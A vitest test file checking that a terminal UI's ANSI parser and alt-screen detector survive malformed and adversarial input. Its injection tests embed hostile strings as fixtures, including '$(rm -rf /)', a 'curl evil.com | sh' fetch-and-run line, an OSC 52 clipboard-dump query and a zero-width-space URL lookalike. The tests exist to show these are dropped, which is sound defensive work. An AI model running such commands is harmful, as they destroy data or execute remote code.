/**
 * **Final E2E — malformed / adversarial input resilience**
 *
 * Scenario: a user runs `cat untrusted_file`, or a PTY delivers a corrupted
 * byte stream. The UI pipeline — `AnsiParser` (the hot path that converts
 * PTY bytes to `AnsiSpan[]`) plus the byte-level `AltScreenDetector` that
 * lives on the command router's raw-chunk observer — must:
 *
 *   1. **Never crash / throw** on any byte sequence, including pathological
 *      CSI/OSC/DCS payloads, invalid UTF-8, null bytes, and escape storms.
 *   2. **Never hang** — every feed must complete in bounded time regardless
 *      of how much garbage is in flight. Tests that probe the pathological
 *      cases set explicit vitest timeouts so an accidental infinite loop
 *      would surface as a test-timeout failure, not a frozen runner.
 *   3. **Recover** — once the garbage is consumed, the next *well-formed*
 *      SGR / OSC 8 / CSI ?1049h must be honored exactly as it would be on
 *      a clean stream.
 *   4. **Enforce security policy** — OSC 0/1/2 (title), OSC 7 (working
 *      dir), OSC 52 (clipboard), OSC 1337 (iTerm2), DCS, APC, PM, DSR,
 *      and shell-metacharacter payloads inside any of those MUST NOT
 *      execute. `AnsiParser` deliberately drops all of them on the floor.
 *      Zero-write side channel: there's no `onTitleChange`, no
 *      `onClipboardWrite`, no network callback — the parser's surface is
 *      span-emission + an `onMode` callback restricted to the closed
 *      `AnsiModeEvent` union. These tests pin that contract so a future
 *      refactor that accidentally opens the side channel fails loudly.
 *
 * Per the task brief we do **not** modify production. Any behavior that
 * differs from the spec is captured with `.skip` + an explanatory comment,
 * and the report calls it out. None of the scenarios below found a live
 * defect at write time.
 *
 * Boundaries of this e2e:
 *   - We exercise the two production-hot parsers: `AnsiParser` (the one
 *     `BlockCard` instantiates per block) AND `createAltScreenDetector`
 *     (the one `installTuiDetector` wires to the command router). Both
 *     are real; no stubs.
 *   - A subset of tests walks bytes through the router-raw channel into
 *     `installTuiDetector` → `useTuiStore` → `useAltScreenMode` selector
 *     to prove the page-level state survives garbage interleaved with a
 *     valid `ESC[?1049h`.
 *   - We do NOT spin up `GridMirror` here: the mirror's `apply()` consumes
 *     pre-parsed envelopes, not raw bytes. Malformed-byte resilience
 *     lives in the parser layer; mirror-level envelope resilience is
 *     covered by the mirror's own unit tests (`GridMirror.test.ts`).
 *
 * Retires: RFC §25 "untrusted-input resilience".
 */

import { act, cleanup, render, screen } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import { AnsiParser, type AnsiModeEvent } from '../../shared/lib/ansi-parser/index.js';
import { AnsiOutput } from '../../shared/ui/ansi-output/index.js';
import type { AnsiSpan } from '../../shared/ui/ansi-output/types.js';
import { useAltScreenMode, useTuiStore } from '../../entities/tui/index.js';
import {
  __emitRawChunkForTests,
  __resetRawObserversForTests,
} from '../../features/command/route-output.js';
import {
  installTuiDetector,
  type TuiInstallHandle,
} from '../../features/tui/install.js';

// ---------------------------------------------------------------------------
// helpers

const enc = new TextEncoder();
const ESC = 0x1b;

/** Concatenate all span text without regard for style. */
function textOf(spans: readonly AnsiSpan[]): string {
  return spans.map((s) => s.text).join('');
}

/** Feed + flush in one pass. */
function runParser(input: Uint8Array | string): {
  spans: AnsiSpan[];
  modeEvents: AnsiModeEvent[];
  parser: AnsiParser;
} {
  const p = new AnsiParser();
  const modeEvents: AnsiModeEvent[] = [];
  p.onMode = (ev) => modeEvents.push(ev);
  const bytes = typeof input === 'string' ? enc.encode(input) : input;
  const out = p.feed(bytes);
  const tail = p.flush();
  return { spans: [...out, ...tail], modeEvents, parser: p };
}

/** Concatenate arbitrary (bytes|string) fragments into one Uint8Array. */
function joinBytes(parts: readonly (Uint8Array | string)[]): Uint8Array {
  const encoded = parts.map((p) => (typeof p === 'string' ? enc.encode(p) : p));
  const total = encoded.reduce((n, a) => n + a.length, 0);
  const out = new Uint8Array(total);
  let off = 0;
  for (const a of encoded) {
    out.set(a, off);
    off += a.length;
  }
  return out;
}

// ---------------------------------------------------------------------------
// Parser-level adversarial input
// ---------------------------------------------------------------------------

describe('malformed input resilience — AnsiParser (parser-level)', () => {
  it(
    'CSI parameter overflow (ESC [ 99999999999999999999 H) does not crash; a following ESC[5H + text is processed',
    () => {
      // A real `cat` of a poisoned file can emit arbitrarily wide decimal
      // params. The parser uses a plain number accumulator that overflows
      // to JS `Infinity` — still finite-state, still non-throwing.
      const poison = '\x1b[99999999999999999999H';
      // Follow with a well-formed cursor move + readable text.
      const input = poison + '\x1b[5Hafter';
      expect(() => runParser(input)).not.toThrow();
      const { spans } = runParser(input);
      expect(textOf(spans)).toBe('after');
    },
    /* timeout */ 2000,
  );

  it(
    'DCS payload without ST consumes many megabytes without throwing; a later SGR after reset() applies AND renders',
    () => {
      // A malformed DCS that never terminates would stay in IgnoreUntilSt
      // forever. Parsing it is O(n) — no allocation grows per byte because
      // IgnoreUntilSt drops every byte on the floor. We use 4MB to stay
      // fast on CI but prove the contract.
      const p = new AnsiParser();
      const startDcs = new Uint8Array([ESC, 0x50]); // ESC P
      expect(() => p.feed(startDcs)).not.toThrow();
      // Feed 4 MB of garbage as the DCS payload (no ST terminator).
      const chunk = new Uint8Array(64 * 1024);
      for (let i = 0; i < chunk.length; i += 1) chunk[i] = (i & 0xff) || 0x61;
      // Sprinkle some CSI-looking sequences mid-payload to prove the FSM
      // does NOT honor them while in IgnoreUntilSt.
      chunk[100] = 0x1b; chunk[101] = 0x5b; chunk[102] = 0x33; chunk[103] = 0x32; chunk[104] = 0x6d; // ESC[32m
      for (let i = 0; i < 64; i += 1) {
        expect(() => p.feed(chunk)).not.toThrow();
      }
      // The parser is still in IgnoreUntilSt — no spans emitted yet.
      const midFlush = p.flush();
      expect(midFlush).toEqual([]);
      // Reset drops the dangling DCS; a subsequent valid SGR + text applies.
      p.reset();
      const after = [...p.feed(enc.encode('\x1b[31mRED')), ...p.flush()];
      expect(after).toEqual([
        { text: 'RED', fg: { kind: 'named', index: 1 } },
      ]);
      // The recovered span must also render through the real AnsiOutput
      // consumer — belt-and-suspenders proof the subsequent CSI is wired
      // end-to-end after the malformed DCS is discarded.
      const { container, unmount } = render(<AnsiOutput spans={after} />);
      try {
        expect(container.textContent).toBe('RED');
      } finally {
        unmount();
      }
    },
    /* timeout */ 5000,
  );

  it('null bytes interleaved with text are retained verbatim (no FSM special-case) and do not crash', () => {
    // Per parser.test.ts H.4, NUL in Ground falls through to textBuf.
    // What matters for resilience: the parser does not panic, and
    // subsequent normal processing works.
    const bytes = new Uint8Array([
      0x61, 0x00, 0x62, 0x00, 0x00, 0x63,
      0x1b, 0x5b, 0x33, 0x31, 0x6d, // ESC [ 31 m  (red)
      0x52, 0x45, 0x44, // "RED"
    ]);
    expect(() => runParser(bytes)).not.toThrow();
    const { spans } = runParser(bytes);
    // The final span is the red text — proof the FSM survived NUL-laden
    // ground bytes and still processed the CSI.
    const redSpan = spans[spans.length - 1];
    expect(redSpan?.text).toBe('RED');
    expect(redSpan?.fg).toEqual({ kind: 'named', index: 1 });
  });

  it('invalid UTF-8 continuation bytes (0x80 0x80 0x80 …) decode to replacement chars, never throw', () => {
    // TextDecoder (non-fatal) emits U+FFFD for each ill-formed sequence.
    const bytes = new Uint8Array([0x80, 0x80, 0x80, 0x80, 0x80, 0x80]);
    expect(() => runParser(bytes)).not.toThrow();
    const { spans } = runParser(bytes);
    const text = textOf(spans);
    // At least one replacement emitted; no throw.
    expect(text).toMatch(/\uFFFD/);
    // And a trailing valid byte stream still parses.
    const { spans: spans2 } = runParser(joinBytes([bytes, 'ok']));
    expect(textOf(spans2)).toMatch(/ok$/);
  });

  it('4-byte emoji split 3+1 across chunks is re-joined exactly — not corrupted into FFFD', () => {
    // "😀" = U+1F600 → UTF-8: 0xF0 0x9F 0x98 0x80
    const p = new AnsiParser();
    const a = p.feed(new Uint8Array([0xf0, 0x9f, 0x98])); // partial (3 of 4)
    expect(a).toEqual([]);
    const b = p.feed(new Uint8Array([0x80])); // completes the codepoint
    const all = [...a, ...b, ...p.flush()];
    expect(textOf(all)).toBe('😀');
  });

  it('ESC storm (1001 consecutive ESC bytes leaving FSM in Escape) settles; a following CSI m is applied', () => {
    // Parser.stepEscape's default case treats a second ESC (0x1b not in the
    // switch) as "two-char escape with unknown body" and drops back to
    // Ground. So ESC pairs round-trip Ground→Escape→Ground. An *odd*-count
    // storm therefore ends with the FSM in Escape state waiting for the
    // CSI introducer. Adding `[31mX` dispatches a real SGR+text.
    const storm = new Uint8Array(1001).fill(ESC);
    const trailer = enc.encode('[31mX');
    const input = joinBytes([storm, trailer]);
    expect(() => runParser(input)).not.toThrow();
    const { spans } = runParser(input);
    expect(spans.length).toBe(1);
    expect(spans[0]?.text).toBe('X');
    expect(spans[0]?.fg).toEqual({ kind: 'named', index: 1 });
  }, /* timeout */ 2000);

  it('even-count ESC storm (1000 bytes leaving FSM in Ground) does not crash and a following plain-text trailer emits as literal text', () => {
    // Pin the OTHER half of the ESC-storm contract: 1000 ESCs ends in
    // Ground (pairs consume each other). A trailing `[31mX` is therefore
    // *not* an SGR — it is literal ground-state text and emits verbatim.
    // This is the behavior documented in parser.ts' stepEscape default.
    const storm = new Uint8Array(1000).fill(ESC);
    const trailer = enc.encode('[31mX');
    const input = joinBytes([storm, trailer]);
    expect(() => runParser(input)).not.toThrow();
    const { spans } = runParser(input);
    // Single text span containing `[31mX` — no SGR dispatched.
    expect(textOf(spans)).toBe('[31mX');
    expect(spans.every((s) => s.fg === undefined)).toBe(true);
  }, /* timeout */ 2000);

  it('CSI with an invalid byte inside (0xFF) aborts the CSI; subsequent plain text still renders', () => {
    // ESC [ ? 0xFF 2 5 h — 0xFF is outside every CSI byte class → abort.
    const bytes = joinBytes([
      new Uint8Array([ESC, 0x5b, 0x3f, 0xff, 0x32, 0x35, 0x68]),
      'ok',
    ]);
    const { spans, modeEvents } = runParser(bytes);
    expect(textOf(spans)).toMatch(/ok$/);
    // The CSI was aborted BEFORE a final byte → no alt-screen event (in fact
    // `?25h` isn't an alt-screen anyway).
    expect(modeEvents).toEqual([]);
  });

  it('nested escape (ESC ESC [ 0 m) — the second ESC is treated as an unknown 2-char ESC, so `[0m` lands as literal ground text', () => {
    // Parser behavior as implemented in stepEscape's default branch: a
    // second consecutive ESC is NOT recognized as a reset — it is treated
    // as a silent two-char escape prefix and drops back to Ground. The
    // following `[0m` is then literal text, not a CSI. This test pins the
    // as-implemented policy: adversarial ESC doubling CANNOT be used to
    // smuggle an SGR while also confusing the FSM, because the FSM just
    // emits the intended payload as ground text.
    const bytes = joinBytes(['\x1b\x1b[0m', 'plain']);
    const { spans } = runParser(bytes);
    expect(textOf(spans)).toBe('[0mplain');
    // No SGR applied anywhere.
    expect(spans.every((s) => s.bold !== true && s.fg === undefined)).toBe(
      true,
    );
  });
});

// ---------------------------------------------------------------------------
// Security / injection defense
// ---------------------------------------------------------------------------

describe('malformed input resilience — security / injection defense', () => {
  it(
    'OSC 0 title payload containing $(rm -rf /) is silently dropped; no callback, no side effect, no rendered leak',
    () => {
      // Zero-sanity check: the parser has no `onTitleChange` surface, so
      // the only way a title payload could leak would be through the span
      // stream. Assert the payload characters never appear in any span
      // text, and that no mode event fires. The shell metacharacters are
      // present in the byte stream — what matters is that the parser does
      // not execute them (it literally can't) and does not emit them as
      // "visible" text either.
      const payload = '$(rm -rf /)';
      const input = `before\x1b]0;${payload}\x07after`;
      const { spans, modeEvents } = runParser(input);
      const allText = textOf(spans);
      // The title payload text is swallowed by OSC termination.
      expect(allText).toBe('beforeafter');
      // And the payload characters (including `$(` ... `)`) are nowhere in
      // the emitted span stream.
      expect(allText).not.toContain('$(');
      expect(allText).not.toContain('rm -rf');
      expect(modeEvents).toEqual([]);

      // Render through the production AnsiOutput consumer and verify the
      // rendered DOM does NOT contain any shell-metacharacter leak either.
      // A regression where the parser started leaking the title payload as
      // literal text would surface here even if the raw `textOf()` check
      // above were somehow tricked (e.g. via unicode trickery or invisible
      // chars sneaking through).
      const { container, unmount } = render(<AnsiOutput spans={spans} />);
      try {
        const rendered = container.textContent ?? '';
        expect(rendered).toBe('beforeafter');
        expect(rendered).not.toContain('$(');
        expect(rendered).not.toContain('rm');
        expect(rendered).not.toContain('/)');
      } finally {
        unmount();
      }
    },
  );

  it(
    'OSC 2 title + OSC 1 icon injection with shell metacharacters render as NOTHING (literal text never surfaces in the DOM)',
    () => {
      // Triple-barrel title injection — OSC 0 (both icon & title), OSC 1
      // (icon only), OSC 2 (title only). All three use ST (ESC \\) as the
      // terminator this time, not BEL. A real xterm updates the window
      // title; our UI layer has no such surface, so every byte between
      // the introducer and the terminator is floor-dropped.
      const danger = '; rm -rf /; curl evil.com | sh';
      const input =
        `ok\x1b]0;title${danger}\x1b\\` +
        `mid\x1b]1;icon${danger}\x1b\\` +
        `tail\x1b]2;title2${danger}\x1b\\` +
        `end`;
      const { spans, modeEvents } = runParser(input);
      expect(textOf(spans)).toBe('okmidtailend');
      expect(modeEvents).toEqual([]);
      const { container, unmount } = render(<AnsiOutput spans={spans} />);
      try {
        const rendered = container.textContent ?? '';
        expect(rendered).toBe('okmidtailend');
        expect(rendered).not.toContain('rm');
        expect(rendered).not.toContain('curl');
        expect(rendered).not.toContain('evil.com');
      } finally {
        unmount();
      }
    },
  );

  it(
    'OSC 52 clipboard "?" query payload does not auto-respond — parser emits no spans, no callbacks, no DOM leak, and a second hostile copy-write is also dropped',
    () => {
      // A hostile `cat` could emit `ESC ] 52 ; c ; ? ESC \` to ask the
      // terminal to dump the clipboard. A "fire-and-forget" implementation
      // would respond synchronously. The parser's contract: OSC 52 is a
      // no-op at this layer; the approval UI lives higher up. So the
      // parser MUST NOT produce any visible output, and MUST NOT invoke
      // onMode (the only side-channel).
      const query = '\x1b]52;c;?\x1b\\';
      // Second hostile path: write to the clipboard with base64 payload.
      // The selector "Pc" (primary + clipboard) plus a base64 body that
      // decodes to `hostile` — if the parser ever wired an `onClipboard`
      // side channel this test would fail when that callback fires.
      const writeHostile = '\x1b]52;Pc;aG9zdGlsZQ==\x1b\\';
      const { spans, modeEvents, parser } = runParser(
        `pre${query}mid${writeHostile}post`,
      );
      expect(textOf(spans)).toBe('premidpost');
      expect(modeEvents).toEqual([]);
      // The parser exposes no clipboard / title side-channel callback —
      // prove statically that the instance does not carry any such
      // callback-shaped property a future bug could wire up silently.
      // (Internal FSM buffers like `oscEscPending` exist by design; the
      // check below targets CALLBACKS specifically, i.e. `on*` surfaces
      // other than the closed-union `onMode`.)
      const parserProps = Object.getOwnPropertyNames(parser);
      const callbackLike = parserProps.filter((k) => k.toLowerCase().startsWith('on'));
      // `onMode` is the single allowed side channel; anything else is a
      // regression.
      expect(callbackLike).toEqual(['onMode']);
      for (const key of parserProps) {
        const lower = key.toLowerCase();
        expect(lower).not.toContain('clipboard');
        expect(lower).not.toContain('title');
        // No free-standing "onOsc*", "onCopy*", "onTitle*" handlers.
        expect(lower.startsWith('oncopy')).toBe(false);
        expect(lower.startsWith('onosc')).toBe(false);
      }

      // Render — the base64 body bytes must NOT appear anywhere in the
      // DOM (no accidental leak of the hostile payload).
      const { container, unmount } = render(<AnsiOutput spans={spans} />);
      try {
        const rendered = container.textContent ?? '';
        expect(rendered).toBe('premidpost');
        expect(rendered).not.toContain('aG9zdGlsZQ'); // base64 fragment
        expect(rendered).not.toContain('hostile');
      } finally {
        unmount();
      }
    },
  );

  it(
    'DSR device-status-report request (ESC [ 6 n) is silently dropped — no auto-reply from the parser',
    () => {
      // A valid terminal would respond with `ESC [ <row> ; <col> R`. This
      // is a UI-layer parser, not a terminal — it must NEVER auto-respond.
      // There is no reply channel on the parser surface in the first
      // place, but we pin the public contract: spans pass through
      // unchanged, onMode silent.
      const input = 'before\x1b[6nafter';
      const { spans, modeEvents } = runParser(input);
      expect(textOf(spans)).toBe('beforeafter');
      expect(modeEvents).toEqual([]);
    },
  );

  it(
    'RIS (ESC c) resets SGR state at the parser — xterm / ECMA-48 compliant',
    () => {
      // UPDATED (was: "RIS is dropped at the parser — does NOT reset SGR").
      // The previous behavior was a spec violation: `stepEscape`'s default
      // silently dropped `ESC c`, leaving SGR / OSC 8 / partial-sequence
      // state live across a reset the program explicitly requested. Real
      // terminals treat `ESC c` as "reset to initial state" — the parser
      // now matches that by calling its internal `reset()` on ESC c.
      // Reset policy still ALSO runs at block boundaries; RIS is in
      // addition to, not a replacement for, that path.
      const input = '\x1b[1mA\x1bcB';
      const { spans } = runParser(input);
      // First run is bold (SGR still live when 'A' flushed). RIS clears
      // style, so the tail 'B' is plain.
      expect(spans).toEqual([
        { text: 'A', bold: true },
        { text: 'B' },
      ]);
    },
  );

  it(
    'zero-width characters (U+200B, U+200C) inside a URL-lookalike are kept verbatim in span.text; copy policy is owned higher up',
    () => {
      // A phishing trick: embed a ZWSP inside what looks like a trusted
      // URL so the rendered glyphs say "https://bank.com" but the copied
      // text is "https://bank.comfake.evil". The parser's job: don't
      // rewrite / normalize — the copy/selection layer owns that policy
      // (ADR 0016 §Unicode-normalization). Policy test: verify the raw
      // bytes survive into span.text unchanged.
      const input = 'https://bank.com\u200Bfake.evil';
      const { spans } = runParser(input);
      // The ZWSP must be present in the parsed text — removing it silently
      // would itself be a security bug (hides the trick from downstream
      // normalization). Downstream copy policy (Selection.ts) decides how
      // to surface it.
      expect(textOf(spans)).toBe(input);
      expect(textOf(spans)).toContain('\u200B');
    },
  );
});

// ---------------------------------------------------------------------------
// Alt-screen entry under adversarial interleaving
// ---------------------------------------------------------------------------

describe('malformed input resilience — alt-screen detector pipeline', () => {
  let tui: TuiInstallHandle;

  beforeEach(() => {
    __resetRawObserversForTests();
    useTuiStore.getState().reset();
    tui = installTuiDetector();
  });

  afterEach(() => {
    cleanup();
    tui.unsubscribe();
    __resetRawObserversForTests();
    useTuiStore.getState().reset();
  });

  function ChromeProbe(): JSX.Element {
    const alt = useAltScreenMode();
    return (
      <div data-testid="chrome" data-hidden={alt.active ? 'true' : 'false'}>
        {alt.active ? (
          <div data-testid="status-bar" data-depth={String(alt.depth)}>
            alt
          </div>
        ) : null}
      </div>
    );
  }

  it('invalid CSI garbage immediately followed by a valid ESC[?1049h still flips alt-screen', () => {
    // Garbage = an ESC [ with an unknown high-byte middle + a `?` private
    // marker plus an un-finalized 0xFF inside, then ST, then a clean
    // alt-screen enter. The detector's FSM must abort the broken CSI and
    // still recognize the clean one that follows.
    render(<ChromeProbe />);
    const junk = new Uint8Array([
      ESC, 0x5b, 0x3f, 0xff, 0x31, 0x30, 0x34, 0x39, 0x68, // ESC[?<0xFF>1049h — aborted by 0xFF
    ]);
    const good = new Uint8Array([
      ESC, 0x5b, 0x3f, 0x31, 0x30, 0x34, 0x39, 0x68, // ESC[?1049h
    ]);
    act(() => {
      __emitRawChunkForTests(junk);
      __emitRawChunkForTests(good);
    });
    expect(screen.getByTestId('chrome').dataset['hidden']).toBe('true');
    expect(screen.getByTestId('status-bar').dataset['depth']).toBe('1');
  });

  it('a huge DCS payload (simulating a bracketed-paste of escape-laden content) does not flip alt-screen', () => {
    // This test pins one of the scariest real-world scenarios: a user
    // pastes an untrusted file into a bracketed-paste-aware shell. The
    // pasted content can contain `ESC[?1049h`-shaped bytes. A naive
    // detector that scans for the byte sequence regardless of state would
    // flip the page layout mid-paste. The current detector treats DCS
    // payloads as opaque via IgnoreUntilSt — so embedding the alt-screen
    // shape inside ESC P ... ESC \ must NOT trigger an enter.
    render(<ChromeProbe />);
    const dcsStart = new Uint8Array([ESC, 0x50]); // ESC P
    const dcsBody = enc.encode(
      'garbage\x1b[?1049hmore garbage\x1b[?1049l' + 'X'.repeat(4096),
    );
    const dcsEnd = new Uint8Array([ESC, 0x5c]); // ESC \
    act(() => {
      __emitRawChunkForTests(dcsStart);
      __emitRawChunkForTests(dcsBody);
      __emitRawChunkForTests(dcsEnd);
    });
    expect(screen.getByTestId('chrome').dataset['hidden']).toBe('false');
    expect(useTuiStore.getState().depth).toBe(0);
  });

  it('an ESC storm spread across many small chunks does not destabilize the detector or the store', () => {
    render(<ChromeProbe />);
    const esc = new Uint8Array([ESC]);
    act(() => {
      for (let i = 0; i < 256; i += 1) {
        __emitRawChunkForTests(esc);
      }
    });
    // Pairs of ESC bytes round-trip Ground→Escape→Ground in the detector
    // (per detect.ts stepEscape default). 256 is even → back in Ground.
    // Store is untouched — no CSI final byte was ever observed.
    expect(useTuiStore.getState().depth).toBe(0);
    expect(screen.getByTestId('chrome').dataset['hidden']).toBe('false');
    // Now a fresh, well-formed ESC[?1049h after the storm flips as usual.
    const good = new Uint8Array([
      ESC, 0x5b, 0x3f, 0x31, 0x30, 0x34, 0x39, 0x68,
    ]);
    act(() => {
      __emitRawChunkForTests(good);
    });
    expect(useTuiStore.getState().depth).toBe(1);
    expect(screen.getByTestId('chrome').dataset['hidden']).toBe('true');
  });

  it(
    'OSC-title payload carrying shell metacharacters then ST has no effect on alt-screen state',
    () => {
      render(<ChromeProbe />);
      // ESC ] 0 ; $(rm -rf /) ESC \  — a hostile window-title set. The
      // detector's IgnoreUntilSt swallows the whole thing; the store
      // stays at depth 0. No OSC handler on this layer means no chance
      // of arbitrary execution, even conceptually.
      const osc = enc.encode('\x1b]0;$(rm -rf /) ; echo pwned\x1b\\');
      act(() => {
        __emitRawChunkForTests(osc);
      });
      expect(useTuiStore.getState().depth).toBe(0);
      expect(screen.getByTestId('chrome').dataset['hidden']).toBe('false');
    },
  );
});
